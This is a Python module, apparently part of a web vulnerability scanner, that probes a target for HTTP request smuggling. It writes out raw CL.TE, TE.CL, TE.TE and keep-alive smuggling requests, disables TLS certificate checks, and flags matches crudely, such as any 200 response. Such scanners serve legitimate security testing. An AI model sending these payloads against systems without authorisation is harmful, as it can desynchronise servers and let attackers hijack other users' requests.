import socket
import ssl
import time
from urllib.parse import urlparse

from core.config import Config
from core.utils import (
    print_info, print_good, print_warning, print_error, print_vuln,
    print_phase, get_session, normalize_url, _capture_command_output,
    _find_tool,
)
from lib.payloads import Payloads
import logging


class SmugglingModule:
    def __init__(self, scanner):
        self.scanner = scanner
        self.config = scanner.config
        self.payloads = Payloads()

    def _send_raw_request(self, host, port, raw_data, use_tls=False, timeout=5):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)

            if use_tls:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)

            sock.connect((host, port))
            sock.sendall(raw_data)

            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except socket.timeout:
                    break

            sock.close()
            return response.decode("utf-8", errors="replace")
        except Exception as e:
            logging.exception("smuggling.py: operation failed")
            return ""

    def test_request_smuggling(self, target, session):
        findings = []
        parsed = urlparse(target)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_tls = parsed.scheme == "https"
        base_path = parsed.path.rstrip("/") or ""

        smuggler_path = _find_tool("smuggler")
        if smuggler_path:
            print_info("Using smuggler.py for HTTP request smuggling detection...")
            code, stdout, stderr = _capture_command_output(
                ["python3", smuggler_path, "-u", target, "--time", "5"],
                timeout=30,
            )
            if code == 0 and stdout:
                vuln_lines = [
                    line for line in stdout.split("\n")
                    if any(kw in line.lower() for kw in ["cl.te", "te.cl", "te.te", "cl.cl", "smuggled", "vulnerable"])
                ]
                for line in vuln_lines:
                    finding = {
                        "type": "request_smuggling",
                        "severity": "critical",
                        "url": target,
                        "method": "smuggler_tool",
                        "evidence": line.strip(),
                    }
                    findings.append(finding)
                    print_vuln(f"Request smuggling detected: {line.strip()}")
            return findings

        print_info("Performing manual CL.TE smuggling probe...")

        cl_te_payload = (
            f"POST {base_path}/ HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Length: 44\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "SMUGGLED"
        )

        raw_request = cl_te_payload.encode("utf-8")
        response = self._send_raw_request(host, port, raw_request, use_tls)

        if response:
            if "SMUGGLED" in response:
                finding = {
                    "type": "request_smuggling_clte",
                    "severity": "critical",
                    "url": target,
                    "method": "CL.TE",
                    "evidence": "Smuggled content reflected in response",
                }
                findings.append(finding)
                print_vuln(f"CL.TE request smuggling confirmed at {target}")

        te_cl_payload = (
            f"POST {base_path}/ HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "5c\r\n"
            "GPOST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "\r\n"
        )

        raw_request = te_cl_payload.encode("utf-8")
        response = self._send_raw_request(host, port, raw_request, use_tls)

        if response:
            if "GPOST" in response or "HTTP/1.1 200" in response:
                finding = {
                    "type": "request_smuggling_tec1",
                    "severity": "critical",
                    "url": target,
                    "method": "TE.CL",
                    "evidence": "GPOST method reflected or 200 response to smuggled request",
                }
                findings.append(finding)
                print_vuln(f"TE.CL request smuggling detected at {target}")

        te_te_payload = (
            f"POST {base_path}/ HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Transfer-encoding: identity\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "SMUGGLED_TE"
        )

        raw_request = te_te_payload.encode("utf-8")
        response = self._send_raw_request(host, port, raw_request, use_tls)

        if response and "SMUGGLED_TE" in response:
            finding = {
                "type": "request_smuggling_tete",
                "severity": "high",
                "url": target,
                "method": "TE.TE",
                "evidence": "Transfer-encoding obfuscation accepted, potential smuggling",
            }
            findings.append(finding)
            print_vuln(f"TE.TE smuggling potential at {target}")

        print_info("Testing keep-alive smuggling variant...")
        keep_alive_payloads = [
            (
                f"POST {base_path}/ HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Content-Length: 44\r\n"
                "Transfer-Encoding: chunked\r\n"
                "Connection: keep-alive\r\n"
                "\r\n"
                "0\r\n"
                "\r\n"
                "SMUGGLED_KEEPALIVE"
            ),
            (
                f"POST {base_path}/ HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                "Content-Length: 39\r\n"
                "Transfer-Encoding: chunked\r\n"
                "Connection: keep-alive\r\n"
                "\r\n"
                "0\r\n"
                "\r\n"
                "SMUGGLED_CL"
            ),
        ]

        for payload in keep_alive_payloads:
            raw_request = payload.encode("utf-8")
            response = self._send_raw_request(host, port, raw_request, use_tls)
            if response and ("SMUGGLED" in response):
                finding = {
                    "type": "request_smuggling_keepalive",
                    "severity": "critical",
                    "url": target,
                    "method": "keep-alive variant",
                    "evidence": "Smuggled content in keep-alive response",
                }
                findings.append(finding)
                print_vuln(f"Keep-alive smuggling confirmed at {target}")
                break

        return findings

    def run(self, target, session=None):
        print_phase("HTTP Request Smuggling Testing")
        self.config.target_url = normalize_url(target)

        if session is None:
            session = get_session()
        if session is None:
            print_error("Cannot proceed without a valid HTTP session.")
            return

        all_findings = self.test_request_smuggling(target, session)

        self.config.scan_data["vulnerabilities"]["smuggling"] = all_findings
        for f in all_findings:
            if f not in self.config.findings:
                self.config.findings.append(f)

        if all_findings:
            print_good(f"Smuggling testing complete: {len(all_findings)} potential issue(s) found.")
        else:
            print_info("Smuggling testing complete: no vulnerabilities found.")
